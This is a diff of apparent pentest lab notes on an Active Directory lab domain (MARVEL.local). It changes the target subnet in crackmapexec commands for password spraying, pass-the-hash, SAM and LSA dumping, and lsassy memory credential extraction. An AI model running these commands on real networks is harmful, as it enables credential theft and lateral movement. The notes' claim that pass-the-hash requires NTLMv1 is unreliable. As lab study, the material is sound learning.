@@ -6,21 +6,21 @@
 
 # Sweep the subnet using crackmapexec
 ---
-- `crackmapexec smb 10.0.1.4/24 -u fcastle -d MARVEL.local -p Password1`
+- `crackmapexec smb 10.0.1.0/24 -u fcastle -d MARVEL.local -p Password1`
 	- Domain `fcastle` user is present on both Punisher and Spiderman, therefore:
 		- ![[Pasted image 20250329154733.png]]
 
 # Pass the Hash attack using crackmapexec:
 ---
 - Only works ==if hash is `NTLMv1`==
-- `crackmapexec smb 10.0.1.4/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth`
+- `crackmapexec smb 10.0.1.0/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth`
 	- ![[Pasted image 20250329155406.png]]
 - **Dumping SAM hashes:**
-- `crackmapexec smb 10.0.1.4/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth --sam`
+- `crackmapexec smb 10.0.1.0/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth --sam`
 	- ![[Pasted image 20250329155628.png]]
 - **Dumping LSA**
 - ---
-- `crackmapexec smb 10.0.1.4/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth --lsa`
+- `crackmapexec smb 10.0.1.0/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth --lsa`
 
 	![[Pasted image 20250329160225.png]]
 
@@ -34,7 +34,7 @@
 - `crackmapexec -L`
 	- `gpp_password` , `impersonation`, `keepass_files`, `keepass_discover`
 	- **`LSASSY`**
-		- `crackmapexec smb 10.0.1.4/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth -M lsassy`
+		- `crackmapexec smb 10.0.1.0/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth -M lsassy`
 		- If there is any **==secret stored in memory of logged in users==**, we can see those.
 
 # Psexec
